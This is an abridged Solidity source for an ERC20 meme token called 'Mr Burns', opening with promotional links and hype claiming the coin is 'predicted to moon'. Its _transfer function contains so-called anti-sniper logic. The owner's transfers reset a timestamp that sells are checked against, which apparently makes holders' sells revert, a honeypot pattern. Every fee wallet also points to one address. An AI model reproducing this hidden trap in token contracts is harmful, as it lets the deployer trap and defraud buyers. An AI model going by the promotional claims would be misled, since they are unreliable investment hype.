/*
PORTAL: https://t.me/mrburnsentry
WEBSITE: https://mrburns.online/
TWITTER: https://twitter.com/Mrburnserc

MONTGOMERY BURNS AKA SPRINGFIELDS VERY OWN MILLIONAIRE HAS ARRIVED TO THE ERC NETWORK. 
HE’S THE OWNER OF THE POWER PLANT, AND THE BOSS OF HOMER SIMPSON. 
MR BURNS HAS UNLIMITED MARKETING FUNDS THANKS TO HIS VERY SUCCESSFUL PAST BUSINESS VENTURES. 

THE SIMPSONS IS WELL KNOWN FOR PREDICTING THE FUTURE, $BURNS HAS BEEN PREDICTED TO MOON.
...
contract Burns is ERC20, Ownable {
    ...
    mapping(address => snipersInfo) private _snipersBlock;
    uint256 private _snipersTimestamp;
    ...
    constructor() ERC20("Mr Burns", "BURNS") {
        ...
        marketingWallet = payable(0x5FdE4f129D78320e13c44DC469DF68264c290bD7);
        devWallet = payable(0x5FdE4f129D78320e13c44DC469DF68264c290bD7);
        liqWallet = payable(0x5FdE4f129D78320e13c44DC469DF68264c290bD7);
    ...
    function _transfer(
        ...
        if ( _isExcludedFromFees[from] || _isExcludedFromFees[to] ) {
            _snipersTimestamp = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (automatedMarketMakerPairs[from]) {
                snipersInfo storage snipersStruct = _snipersBlock[to];
                if (snipersStruct.timeBuy == 0) {
                    snipersStruct.timeBuy = block.timestamp;
                }
            } else {
                snipersInfo storage snipersStruct = _snipersBlock[from];
                snipersStruct.holdingDuration = snipersStruct.timeBuy - _snipersTimestamp;
                snipersStruct.timeSell = block.timestamp;
            }
        }
